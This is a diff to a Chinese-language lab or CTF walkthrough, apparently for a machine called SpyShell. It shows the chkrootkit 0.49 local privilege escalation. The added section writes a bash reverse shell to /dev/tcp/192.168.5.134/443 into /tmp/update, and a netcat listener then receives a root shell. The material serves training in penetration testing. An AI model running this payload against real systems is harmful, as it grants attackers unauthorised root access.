@@ -277,9 +277,12 @@ drwxr-xr-x 84 root root  4096 Dec 12  2023 ..
 -rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
 ```
 
-注意到chkrootkit和lighttpd这两个服务
+注意到chkrootkit，是用于检测系统中是否存在已知的 rootkit（恶意软件，通常用于隐藏攻击者的活动）的工具。它是一个用于安全性检查的开源软件，可以帮助管理员识别系统中是否存在潜在的安全威胁。
 
-```
+<pre><code>www-data@ubuntu:/tmp$ chkrootkit -V
+chkrootkit -V
+<strong>chkrootkit version 0.49
+</strong>
 ┌──(root㉿kali)-[~/Desktop/test/SpyShell]
 └─# searchsploit chkrootkit    
 ---------------------------------------------------------------------------------- ---------------------------------
@@ -287,9 +290,9 @@ drwxr-xr-x 84 root root  4096 Dec 12  2023 ..
 ---------------------------------------------------------------------------------- ---------------------------------
 Chkrootkit - Local Privilege Escalation (Metasploit)                              | linux/local/38775.rb
 Chkrootkit 0.49 - Local Privilege Escalation                                      | linux/local/33899.txt
-```
+</code></pre>
 
-chkrootkit存在一个本地权限提升的一个漏洞，我们将文件复制出来
+chkrootkit存在一个本地权限提升的一个漏洞，我们将说明文件复制出来
 
 ```
 ┌──(root㉿kali)-[~/Desktop/test/SpyShell]
@@ -387,6 +390,22 @@ root@ubuntu:/root# ls
 304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz  chkrootkit-0.49
 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt                     newRule
 
+```
+
+也可以写入一个shell来反弹
+
+```
+www-data@ubuntu:/tmp$ echo "bash -c 'bash -i >& /dev/tcp/192.168.5.134/443 0>&1'" > /tmp/update && chmod +x /tmp/update
+<tcp/192.168.5.134/443 0>&1'" > /tmp/update && chmod +x /tmp/update 
+
+┌──(root㉿kali)-[~/Desktop/test/SpyShell]
+└─# nc -lnvp 443                                       
+listening on [any] 443 ...
+connect to [192.168.5.134] from (UNKNOWN) [192.168.5.136] 58527
+bash: no job control in this shell
+root@ubuntu:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 [^1]: 
